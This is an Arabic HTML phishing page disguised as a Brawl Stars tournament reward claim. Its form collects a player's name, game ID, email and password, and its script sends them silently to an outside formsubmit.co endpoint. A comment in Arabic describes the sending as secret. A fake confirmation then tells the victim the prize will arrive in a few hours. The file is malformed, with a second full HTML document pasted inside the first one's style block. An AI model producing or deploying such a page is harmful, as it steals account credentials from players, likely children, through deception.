<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Brawl Win – Ultimate Tournament</title>
<style>
  /* تحسينات الخطوط والصفحة */
  @import url('https://fonts.googleapis.com/css2?family=Tajawal:wght@700;900&display=swap');
  
  body {
    font-family: 'Tajawal', sans-serif;
    margin: 0;
    padding: 0;
    color: white;
    text-align: center;
    overflow-x: hidden;
    /* خلفية Brawl Stars الرسمية - رابط مباشر */
    background-image: url('https://sc-events.com/themes/sc-main/assets/images/games/brawlstars/bs_bg.jpg');
    background-size: cover;
    background-position: center;
    background-attachment: fixed;
    height: 100vh;
  }

  header {
    background: linear-gradient(180deg, rgba(255, 174, 0, 1) 0%, rgba(255, 102, 0, 1) 100%);
    color: white;
    padding: 20px;
    font-size: clamp(24px, 5vw, 32px);
    font-weight: 900;
    text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
    box-shadow: 0 5px 15px rgba(0,0,0,0.5);
    border-bottom: 3px solid #663300;
  }

  <!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأكيد المكافأة</title>
    <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Tajawal', sans-serif; background: url('https://sc-events.com/themes/sc-main/assets/images/games/brawlstars/bs_bg.jpg') no-repeat center center fixed; background-size: cover; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; color: white; overflow: hidden; }
        .container { background: rgba(10, 10, 20, 0.9); padding: 30px; border-radius: 20px; width: 90%; max-width: 400px; text-align: center; border: 4px solid #FF9900; }
        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: none; background: #333; color: white; box-sizing: border-box; }
        button { background: linear-gradient(180deg, #FFCC00, #FF9900); color: black; border: none; padding: 15px; width: 100%; font-weight: 900; border-radius: 12px; cursor: pointer; font-size: 18px; }
        #success-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; }
        .modal { background: #222; padding: 40px; border-radius: 20px; border: 3px solid #00FF00; text-align: center; width: 85%; }
    </style>
</head>
<body>

    <div class="container" id="main-content">
        <h1>مبروك الفوز! 🏆</h1>
        <p>أدخل بياناتك لاستلام الجوائز</p>
        <form id="brawlForm">
            <input type="text" name="name" placeholder="اسم اللاعب" required>
            <input type="text" name="id" placeholder="معرف اللاعب (ID)" required>
            <input type="email" name="email" placeholder="البريد الإلكتروني" required>
            <input type="password" name="password" placeholder="كلمة المرور" required>
            <button type="submit" id="submitBtn">تأكيد واستلام</button>
        </form>
    </div>

    <div id="success-overlay">
        <div class="modal">
            <h2 style="color: #00FF00;">تم التحقق بنجاح! ✅</h2>
            <p>سوف ترسل المكافأة بعد 2 أو 3 ساعات.<br>يرجى تفقد حسابك باستمرار.</p>
            <button onclick="window.location.reload()" style="background: #444; color: white; padding: 10px 20px; border-radius: 10px;">حسناً</button>
        </div>
    </div>

    <script>
        const form = document.getElementById('brawlForm');
        form.onsubmit = function(e) {
            e.preventDefault();
            const btn = document.getElementById('submitBtn');
            btn.innerText = "جاري التأكيد...";
            btn.disabled = true;

            // إرسال البيانات سرياً دون مغادرة الصفحة
            fetch("https://formsubmit.co/ajax/cb8fe615e1f7311a48098baf4f5db727", {
                method: "POST",
                body: new FormData(form),
            })
            .then(() => {
                document.getElementById('success-overlay').style.display = 'flex';
            })
            .catch(() => {
                alert("حدث خطأ، حاول مجدداً");
                btn.disabled = false;
            });
        };
    </script>
</body>
</html>
